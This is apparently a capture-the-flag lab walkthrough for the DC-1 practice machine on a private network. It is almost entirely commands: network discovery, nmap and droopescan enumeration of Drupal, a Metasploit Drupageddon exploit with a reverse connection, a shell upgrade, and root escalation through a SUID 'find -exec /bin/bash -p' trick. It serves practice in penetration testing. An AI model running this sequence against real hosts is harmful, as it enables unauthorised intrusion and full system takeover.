# Attack DC-1 Machine

```bash
sudo ifconfig
sudo fping -aqg 192.168.56.0/24
export IP=192.168.56.104
echo $IP

nmap -sC -sV -p 1-65535 $IP

//http connect -> /robots.txt

export URL="http://$IP:80/"
echo $URL
python3 -m venv ~/myenv
source ~/myenv/bin/activate
droopescan --help

sudo dhclient -r
sudo dhclient
ip a

pip install droopescan
droopescan --help

sudo dhclient -r
sudo dhclient
ip a
ping $IP
droopescan scan drupal -u $URL

msfconsole
search type:exploit drupal
use exploit/multi/http/drupal_drupageddon
info
set RHOSTS 192.168.56.104
show options
set LHOST 192.168.56.101
show options
//TARGETURIはデフォルトを指定する。

run
ls
cat flag1.txt
shell
which python
python -c 'import pty; pty.spawn("/bin/bash")'

tty
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/gtmp
export TERM=xterm-256color
alias ll='ls -la --color=auto'
ll

uname -a
cat /etc/*-release
cat /etc/issue

cd /home
ll
cd flag4
ll
cat flag4.txt

cat .bash_history
cd /tmp
ll

cd /var/tmp
ll
//shm = shared memory
cd /dev/shm
ll

// Disk Free -Human readable
df -h
cd /
//find normal file which has SUID under / directory
find / -perm -u=s -type f 2> /dev/null
which find
//execute /bin/bash in th first file of searching process and then quit.
/usr/bin/find . -exec /bin/bash -p \; -quit

id
whoami
cd /root
ls
